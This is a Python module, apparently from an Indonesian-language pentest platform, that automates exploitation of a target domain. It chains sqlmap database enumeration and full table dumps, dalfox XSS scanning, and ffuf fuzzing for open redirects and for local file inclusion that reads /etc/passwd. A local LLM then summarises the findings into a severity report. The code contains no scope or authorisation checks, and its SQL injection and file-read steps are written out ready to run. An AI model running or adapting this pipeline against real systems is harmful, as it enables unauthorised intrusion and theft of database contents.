"""
Modul untuk Auto Exploit Pipeline - Otomatis menjalankan exploitation tanpa interaksi user
"""

# ====== IMPORTS ======
import os
import time
import re
import subprocess
import requests
from datetime import datetime
from platform.utils.colors import Colors
from platform.utils.helpers import Helpers
from platform.ollama_config import OLLAMA_API_URL, OLLAMA_MODEL_EXPLOIT

# ====== KELAS UTAMA ======
class AutoExploitPipeline:
    """Kelas untuk auto exploit pipeline - otomatis tanpa interaksi user"""
    
    def __init__(self):
        self.colors = Colors()
        self.helpers = Helpers()
        self.output_dir = self.helpers.output_dir

    def analyze_with_llm_and_save(self, content, vuln_type, domain):
        """Menganalisis hasil eksploitasi dengan LLM dan menyimpan ke file dengan timestamp"""
        print(f"\n{self.colors.BLUE}=== Analisis Otomatis dengan LLM ==={self.colors.NC}")
        print(f"{self.colors.YELLOW}Menganalisis hasil {vuln_type} untuk domain: {domain}{self.colors.NC}")
        
        try:
            # Import VulnerabilityScanner
            from platform.modules.vulnerability import VulnerabilityScanner
            vuln_scanner = VulnerabilityScanner()
            
            # Prompt baru: selalu minta Severity dan Deskripsi dalam format tabel
            prompt = f"""
Anda adalah seorang analis keamanan siber senior.

Analisis hasil eksploitasi berikut untuk domain {domain}:
---
{content}
---

Berikan hasil analisis dalam format tabel berikut (isi semua kolom, jangan kosong):

| Jenis Kerentanan         | Severity | Deskripsi                                                                 |
|--------------------------|----------|---------------------------------------------------------------------------|
| SQL Injection            | (Kritis/Tinggi/Sedang/Rendah/-)    | (isi penjelasan singkat, misal: Eksploitasi berhasil pada ... atau '-' jika tidak ditemukan)           |
| Cross Site Scripting(XSS)| (Kritis/Tinggi/Sedang/Rendah/-)    | (isi penjelasan singkat, misal: Payload XSS berhasil dieksekusi pada ... atau '-' jika tidak ditemukan)|
| Open Redirect            | (Kritis/Tinggi/Sedang/Rendah/-)    | (isi penjelasan singkat, misal: Redirect dapat dimanipulasi ke ... atau '-' jika tidak ditemukan)      |
| LFI                      | (Kritis/Tinggi/Sedang/Rendah/-)    | (isi penjelasan singkat, misal: File /etc/passwd berhasil diakses ... atau '-' jika tidak ditemukan)   |

- Jika tidak ditemukan, isi Severity dengan "-" dan Deskripsi dengan "-".
- Pastikan Severity selalu diisi dengan salah satu: Kritis, Tinggi, Sedang, Rendah, atau "-".
- Jangan ada kolom yang kosong.
"""
            
            # Panggil LLM API
            payload = {
                "model": OLLAMA_MODEL_EXPLOIT,
                "prompt": prompt,
                "stream": False
            }
            
            response = requests.post(OLLAMA_API_URL, json=payload, timeout=300)
            response.raise_for_status()
            
            full_response = response.json()
            analysis_text = full_response.get('response', 'Tidak ada respons dari model.')
            
            # Buat timestamp untuk nama file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"llm_{vuln_type}_{timestamp}.txt"
            
            # Simpan ke direktori output domain
            domain_output_dir = self.helpers.get_domain_output_dir(domain)
            os.makedirs(domain_output_dir, exist_ok=True)
            file_path = os.path.join(domain_output_dir, filename)
            
            # Tulis hasil analisis ke file
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(f"=== Analisis LLM {vuln_type.upper()} ===\n")
                f.write(f"Domain: {domain}\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Jenis Analisis: {vuln_type}\n")
                f.write("=" * 50 + "\n\n")
                f.write("HASIL ANALISIS LLM:\n")
                f.write("-" * 30 + "\n")
                f.write(analysis_text)
                f.write("\n\n" + "=" * 50 + "\n")
                f.write("RAW OUTPUT TOOL:\n")
                f.write("-" * 20 + "\n")
                f.write(content)
            
            print(f"{self.colors.GREEN}[+] Analisis LLM berhasil disimpan ke: {file_path}{self.colors.NC}")
            return file_path
            
        except Exception as e:
            print(f"{self.colors.RED}[!] Gagal menganalisis dengan LLM: {str(e)}{self.colors.NC}")
            print(f"{self.colors.YELLOW}[!] Pastikan Ollama berjalan dan dapat diakses{self.colors.NC}")
            return None

    def parse_sqlmap_databases(self, output):
        """Parse database dari output SQLMap"""
        dbs = []
        for line in output.split('\n'):
            line = line.strip()
            # Cari baris yang mengandung [*] dan nama database
            if line.startswith('[*]') and not 'available databases' in line:
                # Extract database name dari format [*] acuart
                db_name = line[4:].strip()  # Hapus [*] dan spasi
                # Filter hanya nama database yang valid (tidak mengandung timestamp atau kata kunci lain)
                if (db_name and 
                    not db_name.startswith(('starting', 'ending', 'fetched', 'INFO')) and
                    not any(x in db_name for x in ['/', ':']) and
                    len(db_name) > 0 and
                    db_name.replace('_', '').isalnum()):  # Terima underscore dalam nama database
                    dbs.append(db_name)
        return dbs

    def parse_sqlmap_tables(self, output, db_name):
        """Parse tabel dari output SQLMap dengan filter nama tabel yang valid"""
        tables = []
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('|') and line.endswith('|'):
                table_name = line[1:-1].strip()
                # Hanya terima nama tabel yang terdiri dari huruf, angka, dan underscore saja
                if re.fullmatch(r'[a-zA-Z0-9_]+', table_name):
                    tables.append(table_name)
        return tables

    def auto_sqlmap_scan(self, domain):
        """Auto SQLMap scan - langsung scan dan dump tanpa interaksi user"""
        print(f"\n{self.colors.BLUE}=== [AUTO] SQLMap Scan untuk {domain} ==={self.colors.NC}")
        
        # Gunakan Normal Scan sebagai default (Level 3, Risk 2)
        level, risk = 3, 2
        print(f"{self.colors.GREEN}[+] Mode: Normal Scan (Level {level}, Risk {risk}) - Seimbang antara kecepatan dan kedalaman{self.colors.NC}")
        
        # Cari file hasil sorting GF dari tahap footprinting
        gf_out = self.helpers.get_gf_candidates_path('sql', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat SQLi hasil GF tidak ditemukan di: {gf_out}{self.colors.NC}")
            print(f"{self.colors.YELLOW}Pastikan sudah menjalankan footprinting dan file sql_candidates_gf.txt sudah ada.{self.colors.NC}")
            return False
        
        print(f"{self.colors.GREEN}Endpoint kandidat SQLi diambil dari: {gf_out}{self.colors.NC}")
        
        # SQLMap scan satu per satu (dengan progress)
        if not self.helpers.check_command_exists("sqlmap"):
            print(f"{self.colors.RED}[!] sqlmap tidak ditemukan. Pastikan sudah terinstal.{self.colors.NC}")
            return False
        
        output_file = self.helpers.get_scan_output_path('sqlmap', domain)
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        
        # Exclude pattern tertentu
        def should_exclude_url(url):
            exclude_patterns = [
                '/bxss/vuln.php',
            ]
            return any(pattern in url for pattern in exclude_patterns)
        
        urls = [url for url in urls if not should_exclude_url(url)]
        print(f"{self.colors.BLUE}Menjalankan sqlmap satu per satu pada {len(urls)} endpoint hasil filter...{self.colors.NC}")
        
        found_and_dumped = False
        
        for idx, url in enumerate(urls, 1):
            print(f"\n{self.colors.YELLOW}=== [ {idx} / {len(urls)} ] Proses enumerasi untuk: {url} ==={self.colors.NC}")
            print(f"{self.colors.BLUE}Menampilkan database dengan sqlmap...{self.colors.NC}")
            
            sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent --dbs"
            self.helpers.run_command_realtime(sqlmap_cmd)
            
            # Setelah selesai, capture hasil untuk parsing
            result = self.helpers.run_command_capture(sqlmap_cmd)
            filtered_lines = []
            for line in result.splitlines():
                if "[INFO] current status:" in line:
                    continue
                filtered_lines.append(line)
            
            with open(output_file, 'a') as f:
                f.write(f"=== SQLMAP DBS (Level {level}, Risk {risk}) [{url}] ===\n")
                f.write('\n'.join(filtered_lines) + "\n")
            
            dbs = self.parse_sqlmap_databases(result)
            if not dbs:
                print(f"{self.colors.RED}Tidak ditemukan database pada target ini.{self.colors.NC}")
                continue
            
            print(f"\n{self.colors.GREEN}Database yang ditemukan:{self.colors.NC}")
            for i, db in enumerate(dbs, 1):
                print(f"{i}. {db}")
            
            # Pilih database
            while True:
                try:
                    choice = int(input("Pilih nomor database: ")) - 1
                    if 0 <= choice < len(dbs):
                        db_name = dbs[choice]
                        break
                    else:
                        print(f"{self.colors.RED}Pilihan tidak valid.{self.colors.NC}")
                except ValueError:
                    print(f"{self.colors.RED}Masukkan angka yang valid.{self.colors.NC}")
            
            # Tampilkan tabel
            print(f"\n{self.colors.GREEN}Menampilkan tabel pada database '{db_name}'...{self.colors.NC}")
            sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent -D '{db_name}' --tables"
            self.helpers.run_command_realtime(sqlmap_cmd)
            result = self.helpers.run_command_capture(sqlmap_cmd)
            
            filtered_lines = []
            for line in result.splitlines():
                if "[INFO] current status:" in line:
                    continue
                filtered_lines.append(line)
            
            with open(output_file, 'a') as f:
                f.write(f"=== SQLMAP TABLES ({db_name}) (Level {level}, Risk {risk}) [{url}] ===\n")
                f.write('\n'.join(filtered_lines) + "\n")
            
            tables = self.parse_sqlmap_tables(result, db_name)
            if not tables:
                print(f"{self.colors.RED}Tidak ditemukan tabel pada database ini.{self.colors.NC}")
                continue
            
            print(f"\n{self.colors.GREEN}Tabel yang ditemukan di database '{db_name}':{self.colors.NC}")
            for i, table in enumerate(tables, 1):
                print(f"{i}. {table}")
            
            # Opsi untuk memilih tabel
            while True:
                print(f"\n{self.colors.YELLOW}Pilih opsi:{self.colors.NC}")
                print("1. Pilih tabel untuk dump (bisa satu atau lebih)")
                print("2. Dump semua tabel")
                print("3. Kembali ke menu sebelumnya")
                print("Ketik 'q' untuk keluar.")
                print("Pilih opsi (1-3/q): ", end="")
                table_choice = input().strip().lower()
                
                if table_choice == "1":
                    # Pilih satu atau beberapa tabel
                    while True:
                        print(f"{self.colors.YELLOW}Pilih nomor tabel (pisahkan dengan koma jika lebih dari satu, contoh: 1,3,5, atau 'q' untuk keluar):{self.colors.NC}", end=" ")
                        table_choices = input().strip().lower()
                        if table_choices == 'q':
                            break
                        try:
                            choices = [int(x.strip()) - 1 for x in table_choices.split(',')]
                            selected_tables = []
                            for choice in choices:
                                if 0 <= choice < len(tables):
                                    selected_tables.append(tables[choice])
                                else:
                                    print(f"{self.colors.RED}Nomor {choice + 1} tidak valid, dilewati.{self.colors.NC}")
                            if selected_tables:
                                print(f"{self.colors.BLUE}Menjalankan dump untuk tabel: {', '.join(selected_tables)}{self.colors.NC}")
                                for table_name in selected_tables:
                                    print(f"{self.colors.GREEN}Dumping tabel: {table_name}{self.colors.NC}")
                                    sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent -D '{db_name}' -T '{table_name}' --dump"
                                    self.helpers.run_command_realtime(sqlmap_cmd)
                                    result = self.helpers.run_command_capture(sqlmap_cmd)
                                    filtered_lines = []
                                    for line in result.splitlines():
                                        if "[INFO] current status:" in line:
                                            continue
                                        filtered_lines.append(line)
                                    with open(output_file, 'a') as f:
                                        f.write(f"=== SQLMAP DUMP ({db_name}.{table_name}) (Level {level}, Risk {risk}) [{url}] ===\n")
                                        f.write('\n'.join(filtered_lines) + "\n")
                                    print(f"{self.colors.YELLOW}{'='*50}{self.colors.NC}")
                                print(f"{self.colors.GREEN}Proses dump tabel selesai.{self.colors.NC}")
                                found_and_dumped = True
                                break
                            else:
                                print(f"{self.colors.RED}Tidak ada tabel yang dipilih.{self.colors.NC}")
                            break
                        except ValueError:
                            print(f"{self.colors.RED}Format input tidak valid. Gunakan angka yang dipisahkan koma.{self.colors.NC}")
                    break
                    
                elif table_choice == "2":
                    # Dump semua tabel
                    print(f"{self.colors.BLUE}Menjalankan dump untuk semua tabel...{self.colors.NC}")
                    for table_name in tables:
                        print(f"{self.colors.GREEN}Dumping tabel: {table_name}{self.colors.NC}")
                        sqlmap_cmd = f"sqlmap -u '{url}' --batch --level=3 --risk=2 --timeout=5 --retries=1 --threads=5 --technique=EU --smart --tamper=space2comment --random-agent -D '{db_name}' -T '{table_name}' --dump"
                        self.helpers.run_command_realtime(sqlmap_cmd)
                        result = self.helpers.run_command_capture(sqlmap_cmd)
                        filtered_lines = []
                        for line in result.splitlines():
                            if "[INFO] current status:" in line:
                                continue
                            filtered_lines.append(line)
                        with open(output_file, 'a') as f:
                            f.write(f"=== SQLMAP DUMP ({db_name}.{table_name}) (Level {level}, Risk {risk}) [{url}] ===\n")
                            f.write('\n'.join(filtered_lines) + "\n")
                        print(f"{self.colors.YELLOW}{'='*50}{self.colors.NC}")
                    print(f"{self.colors.GREEN}Proses dump semua tabel selesai.{self.colors.NC}")
                    found_and_dumped = True
                    break
                    
                elif table_choice == "3" or table_choice == "q":
                    break
                else:
                    print(f"{self.colors.RED}Pilihan tidak valid.{self.colors.NC}")
            
            # Analisis otomatis dengan LLM
            if found_and_dumped:
                print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM ==={self.colors.NC}")
                # Baca hasil SQLMap yang baru saja dibuat
                with open(output_file, 'r', encoding='utf-8') as f:
                    sqlmap_content = f.read()
                
                # Analisis dengan LLM
                llm_file = self.analyze_with_llm_and_save(sqlmap_content, 'sqlmap', domain)
                if llm_file:
                    print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
                
                # Langsung keluar setelah menemukan dan dump database
                print(f"{self.colors.GREEN}[+] SQLMap scan selesai dan berhasil dump data{self.colors.NC}")
                return True
        
        if not found_and_dumped:
            print(f"{self.colors.YELLOW}[!] Tidak ada database yang berhasil di-dump{self.colors.NC}")
            return False

    def auto_dalfox_scan(self, domain):
        """Auto Dalfox scan - langsung scan tanpa interaksi user"""
        print(f"\n{self.colors.BLUE}=== [AUTO] Dalfox Scan untuk {domain} ==={self.colors.NC}")
        
        # Cari file hasil sorting GF dari tahap footprinting
        gf_out = self.helpers.get_gf_candidates_path('xss', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat XSS hasil GF tidak ditemukan di: {gf_out}{self.colors.NC}")
            print(f"{self.colors.YELLOW}Pastikan sudah menjalankan footprinting dan file xss_candidates_gf.txt sudah ada.{self.colors.NC}")
            return False
        
        print(f"{self.colors.GREEN}Endpoint kandidat XSS diambil dari: {gf_out}{self.colors.NC}")
        
        # Dalfox scan satu per satu
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        
        print(f"{self.colors.BLUE}Menjalankan dalfox satu per satu pada {len(urls)} endpoint hasil filter...{self.colors.NC}")
        
        dalfox_out = self.helpers.get_scan_output_path('dalfox', domain)
        found_xss = False
        
        for idx, url in enumerate(urls, 1):
            print(f"\n{self.colors.YELLOW}=== [ {idx} / {len(urls)} ] Proses scan Dalfox untuk: {url} ==={self.colors.NC}")
            
            dalfox_cmd = f"dalfox url '{url}' --no-color"
            # Jalankan Dalfox dan capture hasil
            result = self.helpers.run_command_capture(dalfox_cmd)
            
            # Simpan hasil ke file output
            with open(dalfox_out, 'a') as f:
                f.write(result + '\n')
            
            print(f"{self.colors.GREEN}Hasil Dalfox untuk URL ini disimpan di: {dalfox_out}{self.colors.NC}")
            
            # Analisis otomatis dengan LLM jika ditemukan XSS
            if result.strip():
                print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM ==={self.colors.NC}")
                # Analisis dengan LLM
                llm_file = self.analyze_with_llm_and_save(result, 'dalfox', domain)
                if llm_file:
                    print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
                    found_xss = True
                    # Langsung keluar setelah menemukan XSS
                    print(f"{self.colors.GREEN}[+] Dalfox scan selesai dan menemukan XSS{self.colors.NC}")
                    return True
        
        if not found_xss:
            print(f"{self.colors.YELLOW}[!] Tidak ada XSS yang ditemukan{self.colors.NC}")
            return False

    def auto_redirect_ffuf(self, domain):
        """Jalankan Redirect ffuf otomatis tanpa input user"""
        gf_out = self.helpers.get_gf_candidates_path('redirect', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat redirect tidak ditemukan: {gf_out}{self.colors.NC}")
            return False
        wordlist = "/usr/share/wordlists/redirect.txt"
        output_file = self.helpers.get_scan_output_path('redirect', domain)
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        found = False
        for url in urls:
            if 'FUZZ' not in url:
                continue
            cmd = f"ffuf -w {wordlist} -u '{url}' -fs 0 -o temp_ffuf_result.txt"
            print(f"{self.colors.YELLOW}[*] Command: {cmd}{self.colors.NC}")
            os.system(cmd)
            os.system("grep -E 'Location:|http|30[1278]' temp_ffuf_result.txt > temp_ffuf_grep.txt")
            with open('temp_ffuf_grep.txt', 'r') as tempf, open(output_file, 'a') as outf:
                outf.write(f"\n=== Hasil ffuf (grep redirect) untuk URL: {url} ===\n")
                grep_content = tempf.read()
                outf.write(grep_content)
                if grep_content.strip():
                    found = True
                    print(f"{self.colors.GREEN}Hasil grep redirect:\n{grep_content}{self.colors.NC}")
        if os.path.exists('temp_ffuf_result.txt'):
            os.remove('temp_ffuf_result.txt')
        if os.path.exists('temp_ffuf_grep.txt'):
            os.remove('temp_ffuf_grep.txt')
        print(f"{self.colors.GREEN}[+] Hasil ffuf redirect disimpan di: {output_file}{self.colors.NC}")
        # Analisis LLM otomatis
        if found:
            try:
                with open(output_file, 'r') as f:
                    redirect_content = f.read()
                if redirect_content.strip():
                    print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM (Open Redirect) ==={self.colors.NC}")
                    llm_file = self.analyze_with_llm_and_save(redirect_content, 'redirect', domain)
                    if llm_file:
                        print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
            except Exception as e:
                print(f"{self.colors.RED}[!] Gagal melakukan analisis LLM untuk redirect: {e}{self.colors.NC}")
        return found

    def auto_lfi_ffuf(self, domain):
        """Jalankan LFI ffuf otomatis tanpa input user"""
        gf_out = self.helpers.get_gf_candidates_path('lfi', domain)
        if not os.path.exists(gf_out) or os.path.getsize(gf_out) == 0:
            print(f"{self.colors.RED}File kandidat LFI tidak ditemukan: {gf_out}{self.colors.NC}")
            return False
        wordlist = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
        output_file = self.helpers.get_scan_output_path('lfi', domain)
        with open(gf_out) as f:
            urls = [line.strip() for line in f if line.strip()]
        found = False
        for url in urls:
            if 'FUZZ' not in url:
                continue
            cmd = f"ffuf -w {wordlist} -u '{url}' -fs 0 -o temp_ffuf_result.txt"
            print(f"{self.colors.YELLOW}[*] Command: {cmd}{self.colors.NC}")
            os.system(cmd)
            os.system("grep 'root:x:0:0:' temp_ffuf_result.txt > temp_ffuf_grep.txt")
            with open('temp_ffuf_grep.txt', 'r') as tempf, open(output_file, 'a') as outf:
                outf.write(f"\n=== Hasil ffuf (grep /etc/passwd) untuk URL: {url} ===\n")
                grep_content = tempf.read()
                outf.write(grep_content)
                if grep_content.strip():
                    found = True
                    print(f"{self.colors.GREEN}Hasil grep LFI (/etc/passwd):\n{grep_content}{self.colors.NC}")
        if os.path.exists('temp_ffuf_result.txt'):
            os.remove('temp_ffuf_result.txt')
        if os.path.exists('temp_ffuf_grep.txt'):
            os.remove('temp_ffuf_grep.txt')
        print(f"{self.colors.GREEN}[+] Hasil ffuf LFI disimpan di: {output_file}{self.colors.NC}")
        # Analisis LLM otomatis
        if found:
            try:
                with open(output_file, 'r') as f:
                    lfi_content = f.read()
                if lfi_content.strip():
                    print(f"\n{self.colors.BLUE}=== Memulai Analisis Otomatis dengan LLM (LFI) ==={self.colors.NC}")
                    llm_file = self.analyze_with_llm_and_save(lfi_content, 'lfi', domain)
                    if llm_file:
                        print(f"{self.colors.GREEN}[+] File analisis LLM tersedia untuk reporting: {llm_file}{self.colors.NC}")
            except Exception as e:
                print(f"{self.colors.RED}[!] Gagal melakukan analisis LLM untuk LFI: {e}{self.colors.NC}")
        return found

    def run_auto_exploit_pipeline(self, domain):
        """Menjalankan auto exploit pipeline lengkap (SQLMap, Dalfox, Redirect, LFI)"""
        print(f"\n{self.colors.BLUE}=== [AUTO EXPLOIT PIPELINE] ==={self.colors.NC}")
        print(f"{self.colors.YELLOW}Menjalankan exploitation otomatis untuk domain: {domain}{self.colors.NC}")
        # 1. SQLMap scan
        sqlmap_success = self.auto_sqlmap_scan(domain)
        # 2. Dalfox scan
        dalfox_success = self.auto_dalfox_scan(domain)
        # 3. Redirect scan
        redirect_success = self.auto_redirect_ffuf(domain)
        # 4. LFI scan
        lfi_success = self.auto_lfi_ffuf(domain)
        # 5. Generate report otomatis
        print(f"\n{self.colors.BLUE}=== Generate Report Otomatis ==={self.colors.NC}")
        from platform.modules.reporting import Reporting
        reporting = Reporting()
        # Kumpulkan file llm yang berhasil
        domain_output_dir = self.helpers.get_domain_output_dir(domain)
        llm_files = []
        if sqlmap_success:
            llm_sqlmap = os.path.join(domain_output_dir, 'llm_sqlmap.txt')
            if os.path.exists(llm_sqlmap) and os.path.getsize(llm_sqlmap) > 0:
                llm_files.append(llm_sqlmap)
        if dalfox_success:
            llm_dalfox = os.path.join(domain_output_dir, 'llm_dalfox.txt')
            if os.path.exists(llm_dalfox) and os.path.getsize(llm_dalfox) > 0:
                llm_files.append(llm_dalfox)
        if redirect_success:
            llm_redirect = os.path.join(domain_output_dir, 'llm_redirect.txt')
            if os.path.exists(llm_redirect) and os.path.getsize(llm_redirect) > 0:
                llm_files.append(llm_redirect)
        if lfi_success:
            llm_lfi = os.path.join(domain_output_dir, 'llm_lfi.txt')
            if os.path.exists(llm_lfi) and os.path.getsize(llm_lfi) > 0:
                llm_files.append(llm_lfi)
        # Jalankan reporting hanya dengan file llm yang ada
        reporting.run(domain, llm_files=llm_files)
        print(f"\n{self.colors.GREEN}[+] Auto Exploit Pipeline selesai!{self.colors.NC}")
        print(f"{self.colors.BLUE}[*] SQLMap: {'Berhasil' if sqlmap_success else 'Tidak ada hasil'}{self.colors.NC}")
        print(f"{self.colors.BLUE}[*] Dalfox: {'Berhasil' if dalfox_success else 'Tidak ada hasil'}{self.colors.NC}")
        print(f"{self.colors.BLUE}[*] Redirect: {'Berhasil' if redirect_success else 'Tidak ada hasil'}{self.colors.NC}")
        print(f"{self.colors.BLUE}[*] LFI: {'Berhasil' if lfi_success else 'Tidak ada hasil'}{self.colors.NC}")
        return {
            'sqlmap': sqlmap_success,
            'dalfox': dalfox_success,
            'redirect': redirect_success,
            'lfi': lfi_success
        } 